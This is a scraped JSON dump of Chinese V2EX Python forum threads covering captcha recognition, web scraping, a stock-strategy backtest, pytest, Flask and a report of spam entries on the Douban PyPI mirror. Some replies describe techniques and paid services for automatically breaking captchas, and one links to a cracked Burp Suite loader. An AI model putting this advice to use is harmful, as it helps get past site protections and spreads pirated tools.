对我个人行为感到遗憾和后悔，发布没有好好考虑到原代码提供者版权问题，对不起。希望大家能原谅，给我改过的机会。以后发布代码更加遵守版权问题。对不起。已在 github 补充了说明情况。\r", "5. 向前辈致敬，同时也对前辈说一声对不起，对大家说声对不起。今后增强自己对于版权保护的认识，更加充分尊重原作者，抱歉。", " 从另外那里拷贝来的，此楼主 和 彼楼主 自行脑补，反了就反了吧", "原作者 @", " 表现的很淡定哈。无论是回复还是另开一帖，都只是说代码问题，不对『抄袭』置评。\r", "可见心胸大度能容人。\r", "\r", "反观一些吃瓜群众，那么着急跳脚。。。", " 说好的不撕， 2 楼情何以堪。。。", "坦白说这代码写的真好  看着舒服 比我强多了 我仔细看了好几遍。。  心里暗暗佩服 LZ 。。。不过看了回帖就不知道怎么说了  总之感谢分享", "V2 正能量啊", "python 功能这么强 刚刚入门 才看几天的手册 得坚持下去~ 感谢分享~~", "20 岁 CTO ，服啊", " 看完二楼，满满的正能量，接着往下看，画风有点不太对啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"QQ截图20161222093916.png\" src=\"https://ooo.0o0.ooo/2016/12/22/585b2ef80a1e3.png\"></p>\n<p>这种类型的，有高人指点下思路没？</p>\n</div></div>"], "reply": "16", "tittle": "求教， python 验证码识别", "comment": ["大量样本+神经网络 ， 切分加识别或者 end2end 解决", "打码平台。。。", " 打码平台可以，试过了。不过速度太慢了。要差不多 10S 了。有没有快速的推荐呢", " 每次的单个字母位置占比有区别，是不是不好切割", "一般就是 opencv 来个二值化，然后再去噪点，然后再来大量样本", "\r", "刚才试了一下, 大概 1.2s 能识别完成.", " ", " \r", "国外机器识别的平台   使用 api\r", "能够识别大部分的验证码", "楼主想问的是切割粘连字符的思路吧。 看这图等比例切也行啊", " \r", "版搜", "tesseract 训练一下？对应 pytesseract", " 其实不需要等比例切啊，二值化之后，去掉部分噪点，然后通过一个算法，名字我忘记了，大致意思就是，一个黑像素点附近如果再没有别的像素点的话，可以判定这个是无效点，于是就将他置白。\r", "省下的就是一个相对好的图片了，再进行有效字符的截取，就是单个字符了，再去识别", "  如果字符不粘连，那投影后在空白处直接切割就可以。\r", "但楼主这图片里面， m 和 z ， h 和 n 两两粘连， 就不能直接切割了。", " 这倒是，对于验证码这样多字体的匹配，我也和楼上一样推荐 tesseract", "提供 90%以上识别率，速度 1s 内的服务，需要可以联系", "opencv find obj \r", "可以满足你的，准确率非常高\r", "只是对 cpu 要求也高\r", "返回对像含坐，按 x 坐标排一下就是结果", "PIL pytesseract"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不知道大家写爬虫有没有遇到这种情况~~~</p>\n<p>浏览器访问正常，爬虫显示这个</p>\n</div></div>"], "reply": "6", "tittle": "浏览本网页，您的浏览器需支持 JavaScript", "comment": ["页面就是这样的，可能是由 javascript 后期修改绘制", " 关键是爬虫一段时间可用，一段时间就显示这个", " 或许被爬后改了机制？", "网站开启了防 CC ，可能正在被攻击", " 应该是这个原因", "`<noscript>`标签？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>本文将演示如何通过程序去实现常见的技术指标。</h1>\n<p><br>技术分析是指以市场行为为研究对象，以判断市场趋势并跟随趋势的周期性变化来进行股票及其他金融衍生物交易决策的方法的总和。技术分析认为市场行为包容消化一切信息、价格以趋势方式波动、历史会重演，常用的有 MACD 、 BOLL 、 RSI 等。\n<br><br><br><strong>下面举个简单的栗子，双均线。</strong>技术分析中通常会用一条近期的移动平均线和远期移动平均线的相对价格趋势来体现股票近期的价格趋势。</p>\n<p>例如当近期均线由下向上突破远期均线时（金叉），通常代表股票近期较为强势可以作为买入信号。</p>\n<p>相反当近期均线由上向下击穿远期均线时（死叉），通常代表股票近期较为疲软作为卖出信号。</p>\n<p>接下来在看如何通过程序去实现这个简单的逻辑（选用 5 个交易日的平均价作为近日均线、选用 60 个交易日的平均价作为远期均线）</p>\n<p><br><strong>首先确定一下策略的回测时间（想看策略在哪一阶段的表现）</strong>\n<br>start = '2012-05-28'                             #回测开始时间\n<br>end = '2016-08-08'        # 回测结束时间</p>\n<p><strong>然后确定策略选股的股票池及标的（策略适用于哪些股票，想看策略相对谁的表现情况）</strong>\n<br>secID = '601318.XSHG'             #中国平安\n<br>benchmark = secID                  # 策略对标标的（这里选取的是中国平安）\n<br>universe = [secID]                 # 股票池，支持股票和基金 （选取的是中国平安）</p>\n<p><strong>其他需要的信息（策略的起始资金、按天进行判断还在用分钟线进行判断、策略调仓频率）</strong>\n<br>capital_base = 100000  #起始资金\n<br>freq = 'd'      # 策略类型，'d'表示日间策略使用日线回测，'m'表示日内策略使用分钟线回测\n<br>refresh_rate = 1      # 调仓频率，表示执行 handle_data 的时间间隔，若 freq = 'd'时间间隔的单位为交易日，若 freq = 'm'时间间隔为分钟\n<br>max_history_window = 100                 #设定调取历史价格区间最大为 100 个交易日\n<br>def initialize(account):                   # 初始化虚拟账户状态，类似于去券商开户<br>pass</p>\n<h1>策略逻辑部分</h1>\n<br>\n局部变量定义：\n<br>def handle_data(account):                  # 每个交易日的买入卖出指令\n<br>    hist1 = account.get_attribute_history('closePrice', 5)      #获取过去 5 个交易日的收盘价\n<br>    hist2 = account.get_attribute_history('closePrice', 60)      #获取过去 60 个交易日的收盘价\n<br>    for s in account.universe:                 #所有股票池中的股票\n <br>       MA5 = hist1[s].mean()     \n <br>       MA60 = hist2[s].mean()              #计算过去 5 个交易日及过去 60 个交易日的均价， mean （）是 python 自带的计算平均值的函数\n<p>买入判断：\n<br>if MA5 &gt; MA60 and s not in account.security_position:            #“金叉”而且当前持仓中没有持有要买入的股票时买入\n<br>amount = int(account.cash / account.referencePrice[s] / 100) * 100<br>\norder(s, amount)             #为了让买入的数量是整数（现金 /要买入上一个交易日的价格）</p>\n<p>卖出判断：\n<br>elif MA5 &lt; MA60 and s in account.security_position:           #“死叉”时而且所卖证券在持仓中时卖出\n<br> order_to(s, 0)</p>\n<p><strong>接着就可以看到策略在历史区间的表现</strong></p>\n<p>年化收益率 16.4%\n基准年化收益率 13.7%\n阿尔法 7%\n贝塔 0.59\n夏普比率 0.49\n收益波动率 26.7%\n信息比率 -0.01\n最大回撤 18.9%\n换手率 14.43</p>\n<p>不管收益如何，但看胜率的话比抛硬币强～～～</p>\n</div></div>"], "reply": "7", "tittle": "『Python 金融应用』技术分析入门", "comment": ["这个是 python 几？", " 应该是 python 2.7 ，我在一个叫优矿的量化平台上做的 ", "不错不错，看明白啥是技术分析了。感谢支持，自己对金融这块感兴趣，业余学习下", "天天软文", " 爬数据的 tushare ，做交易的 vn.py 都是 python 写的，跟大家分享下使用心得。", " 文章里面哪里是用了你说的那 2 个", " 我也没说文章中用了，贴了我自己用过的 python 工具。您有想法，咱们可以多交流。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想做个爬虫抓一些简单的数据，但是翻遍了源代码也没有找到他 FormQuery 方法指定的地址。雷死了。\nPS:还是在小白的小白层面混。。。</p>\n<p>点查询后会打开新的页面，浏览器上 Ctrl+Shift+I 无法跟踪。\n地址在这里： <a href=\"http://www.czce.com.cn/portal/jysj/tbcc/A091106index_1.htm\" rel=\"nofollow\">http://www.czce.com.cn/portal/jysj/tbcc/A091106index_1.htm</a></p>\n<p>PPS ：\n只有这么一个方法：点查询后，真实地址就出现了，\n“ <a href=\"http://www.czce.com.cn/portal/DFSStaticFiles/Future/2016/20161222/FutureDataTrdhedge.htm\" rel=\"nofollow\">http://www.czce.com.cn/portal/DFSStaticFiles/Future/2016/20161222/FutureDataTrdhedge.htm</a> ”\n在抓数据时，替换其时间变量 醉了。</p>\n<p>可有些钻牛角尖的我就想看看表单提交地址怎么发现 - -！</p>\n</div></div>"], "reply": "21", "tittle": "爬虫：如何获得这种类型的表单提交地址？求教。谢谢。", "comment": ["302 跳转\r", "你 post 过去跟踪下 Location 就看到了", "为什么那么麻烦？不就是个简单的日期型列表", " 不是为了解决问题而问问题，是为了提升一下。", " post 之后 502 - -！", "![snipaste20161223_084448.png]( ", ")\r", "\r", "将 form 的 target=\"_blank\"去掉即可", "给你推荐个东西， Burpsuite 。网上版本很多这是现在能用的链接: ", " 密码: wj5k  ，要装 java 环境，装好 java 之后运行 BurpLoader.jar ，给设置代理 8080 然后你再点下那个页面的查询就在 burpsuite\r", "的 Proxy 里看到发送的请求了", "这个很容易吧，连 POST 都不需要，需要查询哪天，直接改地址，而且 POST 之后也只是 302 跳转而已\r", "\r", "\r", "\r", "实例：\r", "\r", "function submitForm(formname,actionurl,target)\r", "{\r", "var absoluteurl = 'http://'+serverip+':'+serverport+actionurl;\r", "window.open(absoluteurl,target,winstyle);\r", "document.all(formname).submit();\r", "}\r", "\r", "var serverip =\"www.czce.com.cn\";\r", "var serverport =\"80\";\r", "\r", "js 里是这么写的", " 嗯，首先谢谢你。这种方式我会的。我想用其他的方式试试。", " 已感谢。新技能 get ！原来改代码还能运行。哈哈哈哈哈哈。", " 好麻烦的感觉。还是 jar ，完全不懂 java 。只记得当年用诺基亚的手机时，下过 jar 格式的小说 - -！", " 谢谢", " 装好 java 双击就可以了", "写爬虫装个抓包工具先，所有请求都可以记录下来，然后是分析包就肯定能找到数据地址。试试 Fiddler2 吧。", " 和 fiddler 比 有啥优点和缺点？", "抓个 http 包就行了，用楼上说的 fiddler 就行。", " 很抱歉又来麻烦你。\r", "\r", "请问为何这样的代码无法获取到数据呢？\r", "`\r", "url = '", "'\r", "\r", "\r", "postDict = {\r", "'dataType':'TRADEHOLDING',\r", "'pubDate':'2016-12-23'\r", "}\r", "\r", "postDicDecoded=urllib.parse.urlencode(postDict).encode(encoding='utf-8')\r", "Request=urllib.request.Request(url, postDicDecoded);\r", "MyPage=urllib.request.urlopen(Request).read().decode(\"utf-8\",\"ignore\")\r", "\r", "`", "没 cookie 吧，个人做爬虫主要是为了节约时间，他们的代码我根本不分析，直接运行：走 Phantom or Nightmare 。根本不管他怎么隐藏逻辑", " 这个网站不需要登录 ，直接浏览器构造地址可以自动跳转\r", " 你说的对。果然需要构造 headers", "preserve log 开关"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>#!/usr/bin/env python\n# coding=utf-8\na=['1','23','4']\nprint a[0][0]\nprint a[0]\n</code></pre>\n<p>上面结果两个 print 输出结果都是字符串 1 ，有什么区别？\n谢谢</p>\n</div></div>"], "reply": "8", "tittle": "请教一个 python 列表问题", "comment": ["```\r", "print '1'[0]\r", "print '123'[0]\r", "```", "第一个输出列表中第一个字符串的第一个字符\r", "第二个直接输出列表一个元素\r", "因为二者都一样所以结果一致", "没有区别", "字符串 以及 列表 都是序列类型。\r", "\r", "a[0] = '1'  # 列表 a 的第一个元素\r", "a[0][0] = '1' # 字符串的第一个字符", "你把 a 变量换成 a=['10','23','4']", " 3q 懂了", " 3q 懂了", " 3q 懂了"]},
{"content": ["<div class=\"topic_content\">flask-restful\r<br>flaskapi\r<br>flask-restless</div>"], "reply": "15", "tittle": "flask 中，做 api，你们在用谁？", "comment": ["都不用", "json 用 ujson", "MethodView + jsonify", "marshmallow ，其他的裸写", "自己造的轮子\r", "flask-restful 如果项目小还可以用用", "裸写", "flask-restless 一堆 bug", "marshmallow + jsonify 这一波", "都不用。", "不需要，而且也不好用", "都不用", "jsonify", "加额外的框架是为了解决什么？", "不用框架，自己用 flask 写 api ，难不难呀？   小白一枚，最近有写 api 的需求...", "用二楼+三楼的方案，思路如我这篇博客所写：\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://blog.python.org/2016/12/python-360-is-now-available.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+PythonInsider+%28Python+Insider%29\" rel=\"nofollow\">Python 3.6.0 is now available!</a></p>\n</div></div>"], "reply": "27", "tittle": "Python 3.6 Released!", "comment": ["改的好多，看了几条就懒得看了", "喜欢新的格式化字符串！", "good", "欢迎楼下简述一下新特性", "新的屁眼已经出现", "亮点貌似是 format string 和 dict 的性能提升\r", "还有一个和 Java 类似的 1_000 写法..", "没人提 PEP 526 变量类型标注吗？可以大大方便静态语法检查", "性能被 PHP7 完爆了， php8 还要引入 jit ， Python 毫无动静啊", " 早就有 pypy 支持 jit 了🙄", " 虽然 php 是世界上最好的语言，你也得看看其他语言的发展呀…", "asyncio 据说修了一个 io 慢的问题和热执行路径优化，号称提速 30%+，不过这个 patch3.5.3 下个月也会发布掉", " 求链接", " 找到了\r", "Future and Task classes now have an optimized C implementation which makes asyncio code up to 30% faster. (Contributed by Yury Selivanov and INADA Naoki in issue 26081 and issue 28544.)", " pypy 兼容性差了些，跟 php7 这种官方版不好比的", "向 ruby 看齐", "Windows filesystem and console encoding changed to UTF-8.\r", "有没有 dalao 解释下", " 神之 php8", "其实我就想问 有老司机在 mac 上试过了么？\r", "\r", "多个版本的 Python 怎么在 mac 上玩，还有就是 brew 可以装了么", " pyenv", " 可以装了，我还是今天重装系统的时候才知道 3.6 出来了", "按照 Ubuntu 的风格，应该官方仓库更新应该得等 17.04 了吧，有点等不及，有老司机介绍下 Ubuntu 上怎么更新这货啊，之前搞 Python2 就挂过一次，刚熟悉 Linux ，用不太久，还不太敢楞更这种系统组件。", "Jedi 似乎还不支持 3.6 ", "\r", "vscode 现在都没法自动补全", " @", "  谢谢 ， 马上去试试", " 自行编译即可，不要替换系统自带的 python ，最无脑的记住编译过程中不要用 sudo", " 昨天 Google 了一下，似乎自行编译也问题很多，所以我用 pyenv 隔离掉了，这个方案风险最小。", " 不编译哪来的 3.6 ？ 你说的 pyenv 是产生可执行文件之后的事情，不管是 alias pyenv virtuanenv 啥的都看个人喜好", " 之前还真没注意原来 tar.gz 是需要编译产生的，我扔到 pyenv 他自动帮我构建好了，刚刚看了下，果然是编译安装的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大概的代码是这样：</p>\n<pre><code>import requests\nimport pytest\n\nclass TestRestApi():\n    url = 'http://xxx.com'\n\n    @pytest.fixture(scope=\"session\")\n    def http_session(self):\n        # 省略设置 cookie 等步骤，返回一个 request.session 对象\n        return requests.Session()\n\n    def test_api_a(self, http_session):\n        response = http_session.post(self.url + '/app/sessioncontextget', json=body)\n        assert response.status_code == 200\n        data = response.json()\n        # 我想保存此 api 的一个返回值\n        self.session_id = data['data']['session_id']\n        assert data['code'] == 200\n\n    def test_api_b(self, http_session):\n        body = {\n            # 请求参数依赖前一个 api 的返回值\n            \"sessionid\": self.session_id,\n        }\n        response = http_session.post(self.url_ge + '/api/taskcreate', json=body)\n        assert response.status_code == 200\n        data = response.json()\n        assert data['errcode'] == 0\n\n</code></pre>\n<p>断点调试发现 session_id 是设置成功了的， test_api_a 也测试通过</p>\n<p><img alt=\"\" src=\"http://ws3.sinaimg.cn/large/98d2e36bjw1fb2715ajwjj20tw03sq4c.jpg\"></p>\n<p>但运行到 test_api_b 时却提示：AttributeError: 'TestRestApi' object has no attribute 'session_id'。不过这也很好理解，单测本来就是每个 case 独立的，每次相当于都是重新运行。</p>\n<p>那么问题来了，这个需求怎么解决？</p>\n<p>还有一个问题， pytest.fixture 的特性感觉不是很方便， http_session 变量无法被 IDE 识别，没有代码提示了（不过这个影响很小），关键是每个测试 case 都要传入 http_session 参数，感觉不够简洁。</p>\n<p>初次使用 py.test ，可能理解不是很透彻，还请见谅。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>解决了。再增加一个fixture</p>\n<pre><code>@staticmethod\n@pytest.fixture(scope=\"session\")\ndef global_values():\n    return {}\n</code></pre>\n<p>然后test case变成：</p>\n<pre><code>def test_api_a(self, http_session: requests.Session, global_values: dict):\n    ……\n    global_values['session_id'] = data['data']['session_id']\n\ndef test_api_b(self, http_session: requests.Session, global_values: dict):\n    ……\n    \"sessionid\": global_values['session_id'],\n</code></pre>\n<p>因为使用的是Python3，还是选择了把fixture设置的变量写进参数里面，再加上类型声明，这样IDE就能自动提示了</p>\n</div></div>"], "reply": "2", "tittle": "请教个 py.test 的使用问题（ case 间参数依赖）", "comment": ["1. 既然有个 case 需要两步，有个依赖，那就放到一起。之前的那个 case 不变", "2. 你可以在 setup 方法里初始化 http_session ，然后作为一个实例属性", " 非常感谢。\r", "1. 你说的这个方法也行。但是不符合我的其它需求，我需要最终出一个报告，所以需要每个 api 在单独的 test case 中。\r", "2. 嗯，这样可以。现在这样做了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如我就准备添加<code>simplemde</code>，如果有做过的 V 友，请指导下，正在开发一个博客，编辑器对我来说太重要了，一直都是用<code>markdown</code>语法写文章，富文本编辑器的话，就用这没那么顺手了。</p>\n</div></div>"], "reply": "6", "tittle": "如何在 Django-admin 后台中添加 markdown 编辑器呢？", "comment": ["自己写个 admin", "\r", "用 markdown2 可以把 markdown 解析成 html ，实时显示的话还没有想到什么办法", "先在 settings 中设置下静态文件地址\r", "在 admin.py 修改\r", "\r", "```\r", "\r", "class Media:\r", "    js = (\r", "        'js/jquery.min.js',\r", "        'js/module.min.js',\r", "        'js/hotkeys.min.js',\r", "        'js/simditor.min.js',\r", "        'js/config.js',\r", "    )\r", "\r", "    css = {\r", "        'all' : ('css/simditor.css')\r", "    }\r", "\r", "```\r", "\r", "config.js\r", "\r", "```\r", "\r", "window.onload = function(){\r", "    var editor = new Simditor({textarea : $('#id_content')});    \r", "}\r", "\r", "```", " \r", " \r", "表示在 django 的 admin 添加了一个 markdown 编辑器，左边编辑，右边阅览，前段展示用 js 插件渲染", "Django pagedown 我感觉是个不错的选择。 simplemde 有一个 django simplemde 的 app ，但我使用中发现一个 bug ，移动端无法输入汉字，查了下相关的 issue ，发现至今没有解决。所以弃用了。", " 我在后台用的就是这个，只不过把默认的编辑器换成`simplemde `的了，前段其他插件渲染"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大概需要实现的功能是</p>\n<ul>\n<li>能够对接 logger ，远程输出日志</li>\n<li>程序崩溃自动报警</li>\n<li>最好有一个 Web Interface 能够实时查看信息</li>\n<li>最好能定向保存几组数据（比如说写了个网页爬虫，每隔一段时间爬虫端自动上报每分钟抓取量抓取成功百分比这样</li>\n</ul>\n<p>类似这样的轮子大家有没有？<br>\n之前有人给我安利过 Azure 的 Application Insights 。。但是苦于自己没有信用卡无法订阅所以只好放弃。。。</p>\n</div></div>"], "reply": "10", "tittle": "大家有没有 python 的应用远程监控的轮子", "comment": ["supervisor 能满足你大部分需求，小部分满足不了的你自己拿源码改下也能实现", "sentry", "1 楼真相", "Sentry 今天早上试了一下，感觉还可以，但是还差那么一点  ", "感觉他完全就是问题驱动的，也就是说一切都以出现 error 为中心  ", "这样的话第四条 performance monitor 就没法满足了  ", "继续寻找。。", "zenoss", "...ELKstack...", "性能监控可以用 newrelic 或国产 oneapm ； newrelic 也支持异常监控，但不如 sentry 好用", " newrelic 需要付费。。", "自己玩票可以先用 free license ，支持最近一天的数据。公司用的话花钱买 APM 非常正常", "supervisor 配 ", " ，不合适自己改改代码就好了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>平时任务（ 30+/s ）很少没什么问题，如果任务到 2000+/s 的时候，就会出现问题，症状为：</p>\n<ul>\n<li>刚开始的时候 flower Dashboard 中的 Succeeded 计数仍然正常累加，但是 Monitor 中图形不再出现。</li>\n<li>几秒中后，所有的 worker 变为 Offline ， Succeeded 计数也停了。</li>\n<li>查看 flower log 为： Substantial drift from celery@iZ23c7xtod4Z may mean clocks are out of sync. .  Current drift is\n17 seconds.  [orig: 2016-12-27 16:42:43.955444 recv: 2016-12-27 16:43:00.002606]</li>\n</ul>\n<p>跑 worker 的机器大概有十几台。</p>\n<p>Google 了一下有人说是机器的时间不同步造成的，我给每台做了同步，而且也看了时间是同步的。然后就不知道怎么解决了，大家有没有遇到过？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Celery Substantial drift from celery@xxx may mean clocks are out of sync", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/SheldonZheng/SMZDM_Monitor\" rel=\"nofollow\">https://github.com/SheldonZheng/SMZDM_Monitor</a></p>\n<p>昨天写的一个什么值得买网站的监测爬虫；可以实现检测指定关键字，如果出现关键字匹配的内容发送邮件到指定邮箱。</p>\n<p>代码写的很烂 第一次用 python 写东西 轻喷</p>\n<p>Usage 里写的不太详细 改改文件开头的那一堆东西就可以用了</p>\n<p>如图所示</p>\n<p><img alt=\"\" src=\"http://p1.bpimg.com/4851/339b8974b7d33960.jpg\"></p>\n</div></div>"], "reply": "30", "tittle": "什么值得买网站的定时检测爬虫", "comment": ["不用这么麻烦。 smzdm 自己提供 rss feed 的，你用 rss2email 加上过滤器就行了。", " 没想到 rss 还能干这事。谢谢了", "之前我也写过一个，出现关键词自动给自己发短信\r", "不过兄弟我得告诉你个悲壮的事。。张大妈客户端有这个功能了。。", " 你说那个关注么。。那个玩意经常刷不出来", " = =我这儿没啊，挺好用的，之前电动牙刷关注了给我推了个接近历低的活动。。", " 好像自从上次改版后关注特别难用，只能关注特定商品或者特定商城，不如原来的分类关注好了，我一般只关注买书方面，但关注中亚会推别的商品，好难用", "哦哦 原来还是有的 只是让我强行关注了一波中亚啥的", "开始写爬虫之前要关注两个事情，网站是不是有 API ，以及是否有 RSS 订阅！", " 这个就是用的网站的 API 拿到的直接是 JSON 数据", "兄弟 加油，我最近也想做一个.. 张大妈自带的推送简直太垃圾了，甚至说废品。\r", "楼上有说 rss 订阅的，其实远远不够符合需求，有些时候我们要的并不是某一个特定商品，而是某一类商品，然后在从中挑选比较热门的，怎么评判。没有大数据的时候只能依靠 评论数 以及点赞的比例。\r", "ps... api 在哪，我怎么没找到？", "等便宜 所花费的时间和精力 都可以赚回来了吧。\r", "\r", "划不来", " 看一眼代码  抓到的包里有一个获取当前最新的 20 条信息的 API ，不算是官方提供的 API ，但是确实可以直接拿来用", " 是的 这个只是玩票性质的  刚需的商品肯定等不了……", " 可以 app 微信 邮件推送，值得买的评论都可以在那里看，还要自己写啥？", " 采集的？\r", "\r", "\r", " 有没有这样一个网站， 购物指导性质的，例如买个台灯，直接推荐 5 个最好的，并且分析优缺点", " 是的", " 评论好像没采到吧。  采这个 流量如何", " 十分钟后才开始采集当前内容的评论，你去翻之前的内容。 V2EX 回复了一段点发送空白了", "色魔张大妈 app 支持 添加关键字 推送", " 等我手下的先忙完了... 再管这个 233  到时候如果找不到接口了，估计还要有劳楼主。", "有个人有微信的公众号接口。可以跟 github 绑了 之后 拿到 key 就可以调用了。微信提醒 比邮箱要快", " ", " 刚发现了这个，但是只有品牌排行，看了自己比较熟悉的几个领域，还是比较中立的\r", "\r", " 张大妈还有一个 chrome 的插件，也支持过滤推送", " ……谢谢 这个看起来蛮好用", " 涨姿势了", " 等干完活空了看下", "以前做了监控关键词后推送到 qq ，用了一段时间后发现太费钱了就不用了。。。", " 想问下 费钱费在哪里？\r", "推送 QQ 怎么做的？", " 费钱的意思就是买的多呗……推送 QQ 基本都是基于 WebQQ 的方案，你可以看看酷 Q 的接口", "嗯 之前用 webqq 不太好用  现在用酷 q 缺点是 windows only", "几年前写过一个类似东西，不过是监测二手东的"]},
{"content": ["<div class=\"topic_content\">环境\r<br>osx version:10.11.5 \r<br>python version:2.7.10\r<br>\r<br>我编译一个 c 文件：\r<br>gcc -fPIC test.c -shared -lpython2.7 -L /usr/lib/python2.7/ -I /usr/include/python2.7/ -o test.so\r<br>\r<br>然后我得到了一个 test.so\r<br>\r<br>如果在系统环境下的 python 执行 import test 是没有问题的。\r<br>但是如果在 python 虚拟环境下(pyenv ， python 版本是一样的)， import test 就会报错\r<br>\r<br>Fatal Python error: PyThreadState_Get: no current thread\r<br>[1] 97703 abort python</div>"], "reply": "5", "tittle": "python 虚拟环境(pyenv)下 python 调用 C so 报错？", "comment": ["我本来还想等其他大神提出看法呢。。。等了这么久没人答。。。\r", "\r", "你的信息不是很足，可以多提供一点。\r", "\r", "import 如果没有找到 module 不会报 fatal error 的，所以你这里的问题不是 Python 没有找到 test 这个模块，而是其他的问题。", "我怎么记得 test 是个保留字呢", "可以把 test.py 的内容列出来看下", " 我也没有什么信息可以提供了。主要是在自带的终端下是可以 import 的，但是 active 一个 pyenv 之后， import 就不成功了。我试过在 Linux 上编译，并没有出现这样的情况。自己也百思不得其解", " 跟 test 没有关系，我换了个别的 module name 也是不行。"]},
{"content": ["<div class=\"topic_content\">第一个,有没有什么办法可以让 python 写的东西可以共享,而且还不需要被分享的另一端只要双击一个文件就可以开始用了?\r<br>第二个,如果想同时传入多个值应该怎么写呢?\r<br>比如 3 4 5 6 这四个值想同时传入...\r<br>谢谢</div>"], "reply": "13", "tittle": "请教两个 python 的小问题", "comment": ["1.首先，语文问题，你是“需要”还是“不需要”\r", "受众中，用 linux/mac 的大部分懂怎么做，用 windows 的，你打包个 exe 给他吧\r", "2.传入参数都是字串，你切割就是了，或者多参数", "第一个问题解决方法很多 比如打包什么的 当然最好的方式是做成 web \r", "\r", "第二个问题 sys.argv 本来就是 list 另外看看 argparse", "语文不好 还没入门\r", "建议看好基础文档再说", "这个妥妥的基本语法都没看吧", "本来指责一下楼上上来就喷\r", "我打脸.......", "多个值传入可以用 list ，也可以用 tuple 。", "关于分享，最推荐的是放到 pypi 上面，用户可以用 pip install YourPackageName 来发布，不过双击即用，只有 Windows 下用 py2exe 或者 pyinstaller 之类的进行打包成单个 exe 文件才可以。\r", "\r", "任何步骤问题搜索上述回复的关键词就能在搜索引擎中获得到答案。", "放 github 不就好了，不论是不是 python 的， or 用 docker", "def func (*args,**kw):\r", "    pass\r", "\r", " ", " ", "第一个问题：做成服务端在线发布是最适合的，不会暴露你的源程序\r", "第二个问题：传入任意个参数都可以， N 种方式可以写，数组，元组，字典，或者多个变量。", "第一个没看明白啊？\r", "第二我理解是要是给函数传参就是*args 和**kwargs", "第一个问题没看明白，我感觉你是想说编译？独立于 python 然后双击运行？\r", "第二个可以用参数列表 *args 和 *kwargs ，百度一下就行", "**kwargs ，少写了星号"]},
{"content": ["<div class=\"topic_content\">以前一直用第三方图片存储，都是用第三方接口把用户上传的图片压缩到一定的分辨率和格式，再保存。\r<br>\r<br>现在用自己的服务器处理图片、压缩，大家一般推荐用什么库好？</div>"], "reply": "7", "tittle": "Python / Flask 处理图片、压缩，大家一般推荐用什么库好？", "comment": ["Pillow?\r", "pillow 吧", "thumbor", "pillow 很好，但是不要和 server 布置在一台物理机上。 pillow 在处理大图片的时候会调用外部库并行处理，很吃 CPU ，如果和 server 在一台物理机上会严重影响吞吐的。", "OpenCV 也可以", " \r", " \r", "   \r", "谢谢， Pillow 哪个版本比较实用？看官方文档，能支持要锁 PNGs 图片的要 3.0.0 以上的版本（需要 zlib 支持），我选了 pip install pillow==3.4.2 的版本。结果开发环境是 win 上的 Python3.4 ，不支持（只支持到 py3.3 ）。因为生产 Ubuntu 上装的是 py3.4 ，不能换 python 版本，大家一般都用 pillow 的哪个版本啊？", "要锁=压缩"]},
{"content": ["<div class=\"topic_content\">最近发现的一门新语言( <a target=\"_blank\" href=\"https://github.com/hylang/hy\" rel=\"nofollow\">https://github.com/hylang/hy</a> )。使用 Lisp 的前缀表达式语法，可以很好的与 Python 进行交互，可以使用宏。我为它写了一篇介绍文( <a target=\"_blank\" href=\"http://blog.nanguage.org/wordpress/2016/12/23/hy-in-brief/\" rel=\"nofollow\">http://blog.nanguage.org/wordpress/2016/12/23/hy-in-brief/</a>)\r<br>欢迎 V 友点评。</div>"], "reply": "12", "tittle": "Python 生态下的 Lisp 方言----Hy", "comment": ["你的博客有毒，打开了 1 分多钟都打不开。 \r", "\r", "全局代理美西海岸服务器也是不行的。 \r", "\r", "天啊， 你怎么做到的", "日本 vps 可以。", "移动 4g 可以。", " 貌似是有点问题，最近我有时候也是要挂 vpn 才能上，不知道怎么的 _(:3 」∠)_", "这个跟 Pixie 比怎么样呢？", "摩洛哥 via project fi 表示很困难", "多年前用过 速度没啥优势 其他倒是不错", "为什么博客要放张图片。。。费我流量", " Pixie 带 jit ，跑得快，但 Hy 能方便使用 CPython 的大量库", " 那感觉 hy 很不错啊！ 我一直希望能有一个基于 python 的 clojure.", "还有这个，黑魔法的感觉\r", "defn 加方括号定义函数, 支持 (.x y) 语法调用方法, 用了 -> 和 ->> 两个 macro 简写嵌套函数调用, require 和 import 语法, 使用 recur 手动尾递归, 以及大量熟悉的函数名, 真的是个 Clojure 方言啊."]},
{"content": ["<div class=\"topic_content\">今天突然脑出血，试试豆瓣源，发现有 https 了，挺好\r<br>\r<br>但是，进去一下，吓死宝宝了！！\r<br>\r<br>豆瓣 pypi 源被污染\r<br>\r<br>图片： <a target=\"_blank\" href=\"https://ooo.0o0.ooo/2016/12/25/585fdb3710f62.png\" rel=\"nofollow\">https://ooo.0o0.ooo/2016/12/25/585fdb3710f62.png</a>\r<br>\r<br>前面全是卖数据的，围观一下\r<br>\r<br><a target=\"_blank\" href=\"https://pypi.doubanio.com/simple/\" rel=\"nofollow\">https://pypi.doubanio.com/simple/</a></div>"], "reply": "32", "tittle": "豆瓣 pypi 源被污染", "comment": ["真的有问题吗？我一直用的豆瓣的源，不会有问题吧！", " ", " 对比官方源，前面的几个电话号码开头的太明显了", " 那我使用的其他包，会有被加入恶意代码的可能吗", "tuna 的也这样了，上游的问题？但是官方源没问题", "这是要搞大新闻了？\r", "\r", "我用过一段时间的豆瓣源呢，后来换的清华的。", " 如果确认是被污染的话很有可能哦~", "\r", "\r", "都是这样，感觉官方的上游被污染过", " ", " 都被污染了==", " 感觉像是 cn mirror 上游被污染了", "我也看到了，和截图一毛一样，他们是怎么污染的呢？", " ", " 官方上游还留有被污染过的痕迹", " 